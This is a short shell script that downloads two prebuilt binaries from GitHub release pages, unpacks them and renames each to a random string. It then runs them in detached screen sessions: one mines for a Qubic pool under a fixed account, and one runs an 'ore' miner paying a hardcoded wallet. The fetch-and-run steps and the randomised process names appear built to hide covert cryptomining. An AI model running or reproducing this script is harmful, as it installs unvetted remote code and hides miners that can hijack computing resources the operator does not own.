apt-get update
apt install -y screen
apt install -y nano
wget https://github.com/atsenax/tangnem/releases/download/v2.4.3/nx100.tar
tar -xf nx100.tar
rm -rf nx100.tar
read -p "nama worker: " WORKER
variable5=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv nx100 $variable5
screen -dmS apool ./$variable5 --account CP_smm --pool qubic2.hk.apool.io:3334 --worker $WORKER --cpu-off
echo apool DONE 100 %
sleep 5
echo next step in 5 second
sleep 5
wget https://github.com/staticneti/otodin/releases/download/v4.1.2/static.tar
tar -xf static.tar
rm -rf static.tar
variable8=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv static $variable8
screen -dmS ore ./$variable8 mine --address 2xQeBibQUfWJi4t4Ua32vM3SjHLbwA6wHuXYHusGp9jm
